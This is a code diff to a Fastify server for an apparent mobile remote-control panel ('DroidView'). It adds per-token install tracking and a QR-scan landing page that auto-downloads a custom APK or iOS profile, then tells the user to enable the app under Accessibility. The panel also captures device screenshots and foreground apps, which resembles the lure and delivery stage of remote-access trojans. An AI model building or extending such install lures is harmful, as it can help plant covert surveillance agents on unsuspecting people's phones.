@@ -4,12 +4,13 @@ import { extname, join, normalize, resolve } from "node:path";
 import cors from "@fastify/cors";
 import jwt from "@fastify/jwt";
 import Fastify from "fastify";
-import type { ApkBuildRequest, LoginRequest, SavedApkBuild } from "@droidview/shared";
+import type { ApkBuildRequest, InstallStepType, LoginRequest, SavedApkBuild } from "@droidview/shared";
 import { buildCustomApk, decodeEnrollment, encodeEnrollment, findBuiltApk, getSafeApkName, resolveAgentArtifact } from "./apkArtifacts.js";
 import { generateIosMobileconfig, generateIosSwiftProject, resolveIosArtifact } from "./iosArtifacts.js";
 import { addLog, adminUser, apps, devices, logs, operatorUser, savedApkBuilds, sessions } from "./data.js";
 import { broadcastDeviceConnect } from "./realtime.js";
 import { getVpnTelemetry } from "./vpnServer.js";
+import { buildZeroTouchQrPayload, getAllInstallSessions, getInstallSession, recordInstallEvent } from "./installTracker.js";
 import {
   captureDeviceScreenshot,
   getDeviceForegroundApp,
@@ -428,6 +429,7 @@ export function buildApp() {
       androidVersion?: string;
       battery?: number;
       ip?: string;
+      ipAddress?: string;
       isEmulator?: boolean;
       networkType?: "wifi" | "4g" | "5g" | "3g" | "ethernet" | "offline";
       networkName?: string;
@@ -623,6 +625,9 @@ export function buildApp() {
         message: `Perfil de configuração Apple iOS (${safeName}.mobileconfig) e projeto Swift gerados com sucesso.`
       });
 
+      const baseServerUrl = payload.serverUrl || "http://localhost:3000";
+      const webInstallUrl = `${baseServerUrl}/install/${encoded}`;
+
       const newBuild: SavedApkBuild = {
         id: `build_ios_${Date.now()}`,
         platform: "ios",
@@ -635,10 +640,11 @@ export function buildApp() {
         lang: "pt",
         downloadUrl: `/ios/download/${encoded}`,
         iosProfileUrl: `/ios/profile/${encoded}`,
+        webInstallUrl,
         savePath: `C:\\Users\\Dell\\Downloads\\${safeName}.mobileconfig`,
         logoDataUrl: payload.logoDataUrl,
         sizeBytes: mobileConfigBuffer.length,
-        qrPayload: `${payload.serverUrl}/ios/profile/${encoded}`,
+        qrPayload: webInstallUrl,
         sha256: sha256Hex,
         redirectUrl: payload.redirectUrl,
         serverUrl: payload.serverUrl,
@@ -654,7 +660,8 @@ export function buildApp() {
         apkName: `${safeName}.mobileconfig`,
         downloadUrl: `/ios/download/${encoded}`,
         iosProfileUrl: `/ios/profile/${encoded}`,
-        qrPayload: `${payload.serverUrl}/ios/profile/${encoded}`,
+        qrPayload: webInstallUrl,
+        webInstallUrl,
         sha256: sha256Hex,
         platform: "ios",
         artifactType: "ios-profile",
@@ -681,6 +688,31 @@ export function buildApp() {
       message: `APK Android customizado (${safeApkName}) compilado com sucesso para instalação direta.`
     });
 
+    const baseServerUrl = payload.serverUrl || "http://localhost:3000";
+    const webInstallUrl = `${baseServerUrl}/install/${encoded}`;
+    const directDownloadFullUrl = `${baseServerUrl}/apk/download/${encoded}`;
+
+    let sha256Hex = "";
+    try {
+      const artifact = await resolveAgentArtifact(encoded);
+      sha256Hex = artifact.sha256;
+    } catch {
+      sha256Hex = createHash("sha256").update(encoded).digest("hex");
+    }
+
+    const zeroTouchObject = buildZeroTouchQrPayload({
+      downloadUrl: directDownloadFullUrl,
+      sha256Checksum: sha256Hex,
+      serverUrl: baseServerUrl,
+      enrollmentToken: payload.enrollmentToken,
+      appName: payload.appName,
+      vpnEnabled: payload.vpnEnabled,
+      vpnProtocol: payload.vpnProtocol,
+      vpnPort: payload.vpnPort,
+      islandProfileEnabled: payload.islandProfileEnabled
+    });
+    const zeroTouchQrJson = JSON.stringify(zeroTouchObject);
+
     const newBuild: SavedApkBuild = {
       id: `build_${Date.now()}`,
       platform: "android",
@@ -691,10 +723,13 @@ export function buildApp() {
       status: "completed",
       lang: "pt",
       downloadUrl: `/apk/download/${encoded}`,
+      webInstallUrl,
       savePath: `C:\\Users\\Dell\\Downloads\\${safeApkName}`,
       logoDataUrl: payload.logoDataUrl,
       sizeBytes: realSize,
-      qrPayload: `droidview://enroll?config=${encoded}`,
+      qrPayload: webInstallUrl,
+      zeroTouchQrPayload: zeroTouchQrJson,
+      sha256: sha256Hex,
       redirectUrl: payload.redirectUrl,
       serverUrl: payload.serverUrl,
       vpnEnabled: payload.vpnEnabled,
@@ -706,19 +741,12 @@ export function buildApp() {
     };
     savedApkBuilds.unshift(newBuild);
 
-    let sha256Hex = "";
-    try {
-      const artifact = await resolveAgentArtifact(encoded);
-      sha256Hex = artifact.sha256;
-    } catch {
-      sha256Hex = createHash("sha256").update(encoded).digest("hex");
-    }
-    newBuild.sha256 = sha256Hex;
-
     return {
       apkName: safeApkName,
       downloadUrl: `/apk/download/${encoded}`,
-      qrPayload: `droidview://enroll?config=${encoded}`,
+      qrPayload: webInstallUrl,
+      zeroTouchQrPayload: zeroTouchQrJson,
+      webInstallUrl,
       sha256: sha256Hex,
       platform: "android",
       artifactType: hasBuiltApk ? "apk" : "enrollment-package",
@@ -815,6 +843,147 @@ export function buildApp() {
     }
   });
 
+  // Rastreamento em tempo real do progresso da esteira de instalação do usuário
+  app.post<{
+    Body: {
+      token: string;
+      step: InstallStepType;
+      appName?: string;
+      platform?: "android" | "ios";
+      deviceModel?: string;
+      metadata?: Record<string, any>;
+    };
+  }>("/install/track", async (request, reply) => {
+    try {
+      const { token, step, appName, platform, deviceModel, metadata } = request.body || {};
+      if (!token || !step) {
+        return reply.code(400).send({ error: "Parâmetros 'token' e 'step' são obrigatórios" });
+      }
+      const session = recordInstallEvent({
+        token,
+        step,
+        appName,
+        platform,
+        deviceModel,
+        ipAddress: request.ip,
+        metadata: {
+          ...metadata,
+          userAgent: request.headers["user-agent"]
+        }
+      });
+      addLog({
+        actor: "installer",
+        action: `install.${step}`,
+        target: token,
+        severity: "info",
+        message: `Instalação [${step}] registrada para ${session.appName} (${session.token})`
+      });
+      return { success: true, session };
+    } catch (err: any) {
+      return reply.code(500).send({ error: err.message });
+    }
+  });
+
+  app.get<{ Params: { token: string } }>("/install/track/:token", async (request, reply) => {
+    const session = getInstallSession(request.params.token);
+    if (!session) {
+      return reply.code(404).send({ error: "Sessão de instalação não encontrada para este token" });
+    }
+    return session;
+  });
+
+  app.get("/install/sessions", { preHandler: (app as any).authenticate }, async () => {
+    return getAllInstallSessions();
+  });
+
+  // Página web móvel inteligente de instalação rápida (aberta ao escanear o QR Code)
+  app.get<{ Params: { config: string } }>("/install/:config", async (request, reply) => {
+    try {
+      const enrollment = decodeEnrollment(request.params.config);
+      const appName = enrollment.appName || "DVIEW Agent";
+      const accentColor = enrollment.screenConfig?.accentColor || "#dc2626";
+      const userAgent = request.headers["user-agent"] || "";
+      const isIos = /iphone|ipad|ipod/i.test(userAgent);
+      const downloadPath = isIos
+        ? `/ios/profile/${request.params.config}`
+        : `/apk/download/${request.params.config}`;
+
+      // Registra download inicial
+      recordInstallEvent({
+        token: enrollment.enrollmentToken,
+        step: "download_started",
+        appName,
+        platform: isIos ? "ios" : "android",
+        ipAddress: request.ip,
+        metadata: { userAgent, source: "qr_web_scan" }
+      });
+
+      const html = `<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Instalar ${appName}</title>
+  <style>
+    :root {
+      --accent: ${accentColor};
+      --bg: #090d16;
+      --card: #111827;
+      --text: #f8fafc;
+      --text-muted: #94a3b8;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+    body { background: var(--bg); color: var(--text); display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
+    .card { background: var(--card); border: 1px solid rgba(255,255,255,0.1); border-radius: 20px; padding: 28px 24px; max-width: 440px; width: 100%; box-shadow: 0 12px 40px rgba(0,0,0,0.7); text-align: center; }
+    .logo-badge { width: 68px; height: 68px; border-radius: 16px; background: var(--accent); color: #fff; display: inline-flex; align-items: center; justify-content: center; font-size: 24px; font-weight: 900; margin-bottom: 16px; box-shadow: 0 4px 20px ${accentColor}66; }
+    h1 { font-size: 20px; font-weight: 800; margin-bottom: 6px; }
+    p.sub { font-size: 13px; color: var(--text-muted); margin-bottom: 24px; line-height: 1.4; }
+    .btn { display: block; width: 100%; padding: 14px; background: var(--accent); color: #ffffff; text-decoration: none; border-radius: 12px; font-weight: 700; font-size: 15px; border: none; cursor: pointer; box-shadow: 0 4px 15px ${accentColor}55; }
+    .steps { margin-top: 24px; text-align: left; background: rgba(0,0,0,0.3); border-radius: 12px; padding: 16px; border: 1px solid rgba(255,255,255,0.06); }
+    .steps h3 { font-size: 12px; text-transform: uppercase; color: var(--text-muted); margin-bottom: 10px; letter-spacing: 0.5px; }
+    .step-item { display: flex; align-items: flex-start; gap: 10px; font-size: 12.5px; margin-bottom: 10px; color: #cbd5e1; }
+    .step-num { width: 20px; height: 20px; border-radius: 50%; background: rgba(255,255,255,0.1); display: grid; place-items: center; font-size: 11px; font-weight: 700; color: var(--accent); flex-shrink: 0; }
+    .progress-bar { width: 100%; height: 4px; background: rgba(255,255,255,0.1); border-radius: 2px; overflow: hidden; margin-bottom: 20px; }
+    .progress-fill { height: 100%; width: 45%; background: var(--accent); animation: pulse 1.5s infinite; }
+    @keyframes pulse { 0% { transform: translateX(-100%); } 100% { transform: translateX(250%); } }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="logo-badge">${appName.substring(0, 3).toUpperCase()}</div>
+    <h1>${appName}</h1>
+    <p class="sub">Download automático iniciado. Se o arquivo não baixar nos próximos segundos, toque no botão abaixo.</p>
+
+    <div class="progress-bar"><div class="progress-fill"></div></div>
+
+    <a href="${downloadPath}" class="btn" id="downloadBtn">
+      ${isIos ? "🍎 Baixar Perfil iOS" : "📦 Baixar APK Novamente"}
+    </a>
+
+    <div class="steps">
+      <h3>Instruções de Instalação:</h3>
+      <div class="step-item"><span class="step-num">1</span><span>Confirme o download do instalador oficial no navegador.</span></div>
+      <div class="step-item"><span class="step-num">2</span><span>Abra o arquivo baixado e toque em <strong>Instalar</strong>.</span></div>
+      <div class="step-item"><span class="step-num">3</span><span>Abra o app e ative o serviço em <strong>Acessibilidade</strong>.</span></div>
+      <div class="step-item"><span class="step-num">4</span><span>Pronto! O aplicativo sincronizará com a central de suporte.</span></div>
+    </div>
+  </div>
+
+  <script>
+    // Inicia download automaticamente após 500ms
+    setTimeout(function() {
+      window.location.href = "${downloadPath}";
+    }, 500);
+  </script>
+</body>
+</html>`;
+
+      return reply.type("text/html; charset=utf-8").send(html);
+    } catch {
+      return reply.code(400).send({ error: "Configuração de instalação inválida" });
+    }
+  });
+
   const MIME_TYPES: Record<string, string> = {
     ".html": "text/html; charset=utf-8",
     ".js": "application/javascript; charset=utf-8",
@@ -857,6 +1026,7 @@ export function buildApp() {
         "/apps",
         "/health",
         "/vpn",
+        "/install",
         "/socket.io"
       ];
 
